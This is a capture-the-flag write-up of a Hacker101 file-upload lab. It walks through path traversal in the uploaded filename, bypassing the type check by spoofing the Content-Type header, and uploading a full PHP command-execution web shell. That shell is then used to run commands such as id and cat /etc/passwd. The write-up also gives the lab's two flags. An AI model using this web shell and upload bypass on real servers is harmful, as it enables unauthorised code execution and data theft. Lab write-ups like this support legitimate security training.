The App is has a file upload mechanism and possibly also stores files.

App error while uploading:

`ERROR: Only PNG format supported in trial.`

Gobuster finds a few interesting directories.

I upload the correct file type which directs me to a new page which displays the image.

`https://4edd3b950bdd6af681d525c5b016fe5e.ctf.hacker101.com/files/fdfc1bceea7a0ff6b9bc8edc6f412670_tanya2.png`

I try accessing just the files folder:

`You don't have permission to access /files/ on this server.`

This could be some type of directory traversal required to complete the room.

The error also discloses server information:

`Apache/2.4.7 (Ubuntu) Server at 4edd3b950bdd6af681d525c5b016fe5e.ctf.hacker101.com Port 80`

I find an exploit related to the server. This probably isn't the way to complete the lab, but it's good practice. 

_Apache 2.4.7 + PHP 7.0.2 - 'openssl_seal()' Uninitialized Memory Code Execution_
https://www.exploit-db.com/exploits/40142

I modify the request to try uploading the file into a different location with path traversal:

![[Pasted image 20240908050509.png]]

Payload:

`/../../tanya2.png`

This seems puts me in the index.php

In the response i get a flag.
`^FLAG^d64d564fc633eea2d855780c38543fc0b04efe731438a1afd58ad5d2a9fcb1af$FLAG$`

![[Pasted image 20240908050743.png]]

I now know i can upload to index.php allowing me to execute php and get code execution. 

Exploit:
`/usr/share/webshells/php/simple-backdoor.php`

```php
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
```

Payload:
`/../../tanya2.php`

![[Pasted image 20240908051546.png]]

You can see on the response tab where the file will be put. 
`Location: files/9407206a6501d224f798d14e4c7778d2_/../../tanya2.php`

This should allow me to get RCE on the web-server. 

![[Pasted image 20240908051941.png]]

_Probably you are worried that the server won't let me upload the file as now it is .php and not .png as should, but actually the server does not care about the extension of the file, it cares about the header Content-type, which specify the type of the content delivered in the request._

_As long as you keep the value of the header as PNG, the server will allow your request: Content-Type: image/png_.

I run id and as expected i'm on `www-data` account. I take a look to see if it has netcat installed with `which+nc` and it returns with the response teeling me it's in `/bin/nc` so i know it's installed.

I `ls` list my current directory:

```php
000-default.conf
Dockerfile
doUpload.php
files
index.php
php.ini
setup.sh
tanya2.php
tanya2.png
upload.php
```

I cat the `index.php` file and find another flag.
`^FLAG^f3ef2d438e4758ca559b2a35373e805251383a2c672fdae0dcac8121bf20adf9$FLAG$`

![[Pasted image 20240908053220.png]]

Looking at the lab again i notice i only required the two flags so no need to get any type of web shell.

---

**Completed:** _05:33 2024-09-08_

